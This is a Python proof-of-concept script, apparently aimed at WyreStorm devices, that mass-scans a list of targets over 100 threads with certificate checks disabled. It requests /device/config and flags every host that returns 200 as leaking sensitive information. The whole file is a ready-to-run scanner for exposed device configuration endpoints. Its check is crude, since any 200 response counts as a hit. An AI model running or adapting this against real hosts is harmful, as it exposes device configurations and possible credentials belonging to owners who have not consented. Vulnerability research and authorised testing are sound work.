import argparse,sys,requests,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def main():
    """主函数"""
    banner()
    parser = argparse.ArgumentParser(description="这是脚本的提示信息")
    parser.add_argument('-u','--url',type=str,help='请输入你的url')
    parser.add_argument('-f','--file',type=str,help='请输入文件名')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
def banner():
    banner = """
 █     █░▓██   ██▓ ██▀███  ▓█████   ██████ ▄▄▄█████▓ ▒█████   ██▀███   ███▄ ▄███▓
▓█░ █ ░█░ ▒██  ██▒▓██ ▒ ██▒▓█   ▀ ▒██    ▒ ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒▓██▒▀█▀ ██▒
▒█░ █ ░█   ▒██ ██░▓██ ░▄█ ▒▒███   ░ ▓██▄   ▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒▓██    ▓██░
░█░ █ ░█   ░ ▐██▓░▒██▀▀█▄  ▒▓█  ▄   ▒   ██▒░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  ▒██    ▒██ 
░░██▒██▓   ░ ██▒▓░░██▓ ▒██▒░▒████▒▒██████▒▒  ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒▒██▒   ░██▒
░ ▓░▒ ▒     ██▒▒▒ ░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒░   ░  ░
  ▒ ░ ░   ▓██ ░▒░   ░▒ ░ ▒░ ░ ░  ░░ ░▒  ░ ░    ░      ░ ▒ ▒░   ░▒ ░ ▒░░  ░      ░
  ░   ░   ▒ ▒ ░░    ░░   ░    ░   ░  ░  ░    ░      ░ ░ ░ ▒    ░░   ░ ░      ░   
    ░     ░ ░        ░        ░  ░      ░               ░ ░     ░            ░   
          ░ ░                                                                                                
                                            author:heichao
                                            version:1.0.0
"""
    print(banner)
def poc(target):
    url = target + "/device/config"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
        'Te': 'trailers'
    }
    try:
        response = requests.get(url=url,headers=headers,verify=False)
        if response.status_code == 200:
            print(f"[+]{target}有敏感信息泄露漏洞")
        else:
            print(f"[-]{target} none")
    except:
        print(f"[*]{target} sever error")

if __name__ == '__main__':
    main()